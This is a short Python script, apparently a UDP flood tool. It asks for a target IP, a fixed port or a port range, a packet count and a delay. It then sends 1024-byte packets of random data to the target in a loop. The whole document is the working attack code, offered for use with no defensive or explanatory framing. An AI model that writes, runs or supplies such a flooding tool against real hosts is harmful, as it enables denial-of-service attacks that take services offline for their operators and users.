import socket
import random
import time
import ipaddress

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter the target IP: ")

try:
    ipaddress.ip_address(ip)
except ValueError:
    print("IP inválido!")
    exit()

port_mode = input("Do you want to use a fixed (F) or random (R) port? [F/R]: ").strip().upper()

if port_mode == 'F':
    port = int(input("Enter the port: "))
else:
    start_port = int(input("Starting port: "))
    end_port = int(input("Ending port: "))

max_packets = int(input("How many packets do you want to send? (e.g., 1000): "))
delay = float(input("Delay between packets (seconds, e.g., 0.01): "))

print("\nStarting to send packets...\n")

for i in range(1, max_packets + 1):
    try:
        data = random._urandom(1024)
        if port_mode == 'F':
            destination_port = port
        else:
            destination_port = random.randint(start_port, end_port)

        s.sendto(data, (ip, destination_port))
        print(f"[{i}] Packet sent to {ip}:{destination_port}")
        time.sleep(delay)
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
        break
    except Exception as e:
        print(f"Error sending packet: {e}")
        break

print("\nPacket sending complete.")
s.close()